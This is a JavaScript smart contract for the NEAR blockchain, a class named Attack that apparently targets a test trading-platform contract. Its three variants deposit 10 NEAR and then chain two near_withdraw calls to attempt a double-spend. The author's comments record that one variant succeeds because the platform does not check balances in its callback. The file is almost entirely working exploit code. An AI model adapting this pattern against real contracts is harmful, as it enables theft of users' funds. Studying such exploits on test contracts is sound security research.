import { NearBindgen, call, NearPromise } from 'near-sdk-js';

const GAS = 50_000_000_000_000n;
const NO_DEPOSIT = 0n;

@NearBindgen({})
class Attack {
  @call({})
  attack() {
    // return this.case1();
    return this.case2();
    // return this.case3();
  }

  /**
   * Works as expected: Everything is run sequentially, so you are not able to overdraft your balance in the trading
   * platform contract.
   */
  case1() {
    const balance = 10n * 10n ** 24n; // 10 NEAR

    return NearPromise.new('trading-platform.test.near')
      .functionCall('near_deposit', '', balance, GAS)
      .then(
        NearPromise.new('trading-platform.test.near').functionCall(
          'near_withdraw',
          JSON.stringify({ amount: balance.toString() }),
          NO_DEPOSIT,
          GAS,
        ),
      )
      .then(
        NearPromise.new('trading-platform.test.near').functionCall(
          'near_withdraw',
          JSON.stringify({ amount: balance.toString() }),
          NO_DEPOSIT,
          GAS,
        ),
      );
  }

  /**
   * I don't understand what's happening here. Some operations seem to run sequentially (withdraw after deposit works),
   * some in parallel (double spending attack caused by trading platform not checking the balance in the callback works too).
   */
  case2() {
    const balance = 10n * 10n ** 24n; // 10 NEAR

    return NearPromise.new('trading-platform.test.near')
      .functionCall('near_deposit', '', balance, GAS)
      .functionCall(
        'near_withdraw',
        JSON.stringify({ amount: balance.toString() }),
        NO_DEPOSIT,
        GAS,
      )
      .functionCall(
        'near_withdraw',
        JSON.stringify({ amount: balance.toString() }),
        NO_DEPOSIT,
        GAS,
      );
  }

  // Here I would expect double spend attack to work, but it fails with `Cannot callback joint promise`.
  case3() {
    const balance = 10n * 10n ** 24n; // 10 NEAR

    return NearPromise.new('trading-platform.test.near')
      .functionCall('near_deposit', '', balance, GAS)
      .then(
        NearPromise.new('trading-platform.test.near')
          .functionCall(
            'near_withdraw',
            JSON.stringify({ amount: balance.toString() }),
            NO_DEPOSIT,
            GAS,
          )
          .and(
            NearPromise.new('trading-platform.test.near').functionCall(
              'near_withdraw',
              JSON.stringify({ amount: balance.toString() }),
              NO_DEPOSIT,
              GAS,
            ),
          ),
      );
  }
}
